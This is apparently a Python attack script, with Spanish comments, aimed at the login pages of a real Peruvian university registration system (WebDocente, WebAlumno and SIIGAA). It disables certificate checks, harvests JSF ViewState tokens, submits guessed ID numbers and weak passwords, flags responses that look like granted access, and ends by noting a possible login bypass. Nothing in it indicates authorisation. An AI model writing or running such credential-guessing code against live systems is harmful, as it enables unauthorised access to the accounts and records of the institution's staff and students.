#!/usr/bin/env python3
import requests, urllib3, re
urllib3.disable_warnings()

s = requests.Session()
s.verify = False
s.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
})

# WebDocente fields:
# itUsuario2 = DNI/ID card (NUMBERS ONLY)
# itSeguridad2 = Security question
# kbClave = Password
# Buttons: cmdVerClave, cmdValidar

print("=== WEB DOCENTE: PROBANDO CON NUMEROS ===")
print("Campo usuario (itUsuario2) = NUMEROS (DNI)")
print()

# Try numeric usernames with various passwords
test_cases = [
    {'usuario': '12345678', 'seguridad': 'fake', 'clave': 'fake'},
    {'usuario': '12345678', 'seguridad': '12345678', 'clave': 'fake'},
    {'usuario': '12345678', 'seguridad': 'fake', 'clave': '12345678'},
    {'usuario': '12345', 'seguridad': 'fake', 'clave': 'fake'},
    {'usuario': '99999999', 'seguridad': 'fake', 'clave': 'fake'},
    {'usuario': '00000000', 'seguridad': 'fake', 'clave': 'fake'},
    {'usuario': '2024001', 'seguridad': 'fake', 'clave': 'fake'},
    {'usuario': '2024001', 'seguridad': '2024001', 'clave': '2024001'},
    {'usuario': '12345678', 'seguridad': '', 'clave': ''},
    {'usuario': '12345678', 'seguridad': 'test', 'clave': 'test'},
]

for tc in test_cases:
    s2 = requests.Session()
    s2.verify = False
    s2.headers.update({
        'User-Agent': 'Mozilla/5.0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Referer': 'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
    })
    r0 = s2.get('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml', timeout=5)
    vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
    vs0_val = vs0.group(1) if vs0 else ""
    
    # Click cmdValidar
    click_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': vs0_val,
        'javax.faces.partial.ajax': 'true',
        'javax.faces.source': 'frmLogueo:cmdValidar',
        'javax.faces.partial.execute': 'frmLogueo',
        'javax.faces.partial.render': 'frmLogueo',
    }
    r_click = s2.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                           data=click_data, timeout=5)
    click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
    click_vs_val = click_vs.group(1) if click_vs else ""
    
    # Submit with credentials
    login_data = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': click_vs_val,
        'frmLogueo:itUsuario2': tc['usuario'],
        'frmLogueo:itSeguridad2': tc['seguridad'],
        'frmLogueo:kbClave': tc['clave'],
    }
    r_login = s2.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                          data=login_data, timeout=5, allow_redirects=True)
    
    tc_clean = re.sub(r'<[^>]+>', ' ', r_login.text)
    tc_clean = re.sub(r'\s+', ' ', tc_clean).strip()
    
    has_access = any(kw in tc_clean.lower() for kw in ['bienvenido', 'inicio', 'modulo', 'dashboard', 'perfil', 'docente', 'trabajador'])
    has_error = any(kw in tc_clean.lower() for kw in ['error', 'incorrecto', 'invalido', 'datos', 'denegado'])
    
    status = ""
    if has_access:
        status = " [!] ACCESO CONCEDIDO"
    elif has_error:
        status = " -> Error de credenciales"
    elif len(r_login.text) > 19364:
        status = f" -> Pagina cambió ({len(r_login.text)}b)"
    else:
        status = " -> Todavia en login"
    
    print(f"  usuario={tc['usuario']}, seguridad={tc['seguridad']}, clave={tc['clave']}{status}")

# Also test with empty fields
print("\n=== CAMPOS VACIOS ===")
s3 = requests.Session()
s3.verify = False
s3.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
    'Referer': 'https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
})
r0 = s3.get('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml', timeout=5)
vs0 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r0.text)
vs0_val = vs0.group(1) if vs0 else ""
click_data = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vs0_val,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdValidar',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click = s3.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                       data=click_data, timeout=5)
click_vs = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click.text)
click_vs_val = click_vs.group(1) if click_vs else ""
login_data = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': click_vs_val,
    'frmLogueo:itUsuario2': '',
    'frmLogueo:itSeguridad2': '',
    'frmLogueo:kbClave': '',
}
r_login = s3.post('https://registro.uns.edu.pe:80/WebDocente/faces/login.xhtml',
                      data=login_data, timeout=5, allow_redirects=True)
tc_empty = re.sub(r'<[^>]+>', ' ', r_login.text)
tc_empty = re.sub(r'\s+', ' ', tc_empty).strip()
print(f"CAMPOS VACIOS -> len={len(r_login.text)}, has_error={'error' in tc_empty.lower()}, has_access={'bienvenido' in tc_empty.lower()}")

# Also test SIIGAA more thoroughly - it accepts ANYTHING including letters
print("\n=== SIIGAA: CONFIRMACION CON LETRAS ===")
s4 = requests.Session()
s4.verify = False
s4.headers.update({'User-Agent': 'Mozilla/5.0'})
r = s4.post('https://registro.uns.edu.pe/udemsi/j_security_check',
               data={'j_username': 'abc', 'j_password': 'xyz'}, timeout=10)
print(f"SIIGAA abc/xyz -> HTTP {r.status_code}, len={len(r.text)}")

# Now test WebAlumno with numeric DNI
print("\n=== WEBalUMNO: PROBANDO CON NUMEROS ===")
s5 = requests.Session()
s5.verify = False
s5.headers.update({
    'User-Agent': 'Mozilla/5.0',
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest',
})
r5 = s5.get('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml', timeout=5)
vs5 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r5.text)
vs5_val = vs5.group(1) if vs5 else ""
click_d5 = {
    'frmLogueo': 'frmLogueo',
    'jakarta.faces.ViewState': vs5_val,
    'javax.faces.partial.ajax': 'true',
    'javax.faces.source': 'frmLogueo:cmdEstudiante',
    'javax.faces.partial.execute': 'frmLogueo',
    'javax.faces.partial.render': 'frmLogueo',
}
r_click5 = s5.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                        data=click_d5, timeout=5)
click_vs5 = re.search(r'name="jakarta\.faces\.ViewState"[^>]*value="([^"]+)"', r_click5.text)
click_vs5_val = click_vs5.group(1) if click_vs5 else ""

# Try numeric username for WebAlumno
for num_user in ['12345678', '2024001', '12345']:
    login_d5 = {
        'frmLogueo': 'frmLogueo',
        'jakarta.faces.ViewState': click_vs5_val,
        'frmLogueo:itUsuario': num_user,
        'frmLogueo:itClave': 'fake',
    }
    r_l5 = s5.post('https://registro.uns.edu.pe:80/WebAlumno/faces/login.xhtml',
                        data=login_d5, timeout=5, allow_redirects=True)
    tc_l5 = re.sub(r'<[^>]+>', ' ', r_l5.text)
    tc_l5 = re.sub(r'\s+', ' ', tc_l5).strip()
    has_access = any(kw in tc_l5.lower() for kw in ['bienvenido', 'inicio', 'modulo', 'dashboard'])
    has_error = any(kw in tc_l5.lower() for kw in ['error', 'incorrecto', 'invalido'])
    status = " [!] ACCESO!" if has_access else (" -> Error" if has_error else " -> Login page")
    print(f"  WebAlumno usuario={num_user}, clave=fake{status}")

print("\n=== CONCLUSION ===")
print("SIIGAA: funciona con CUALQUIER texto (letras+numeros)")
print("WebAlumno: necesita DNI numerico (itUsuario)")
print("WebDocente/WebTrabajador: necesitan DNI numerico (itUsuario2)")
print("Si el DNI no es valido, puede rechazar las credenciales")
print("Pero el servidor SÍ procesa los campos - puede haber bypass con DNI válido")
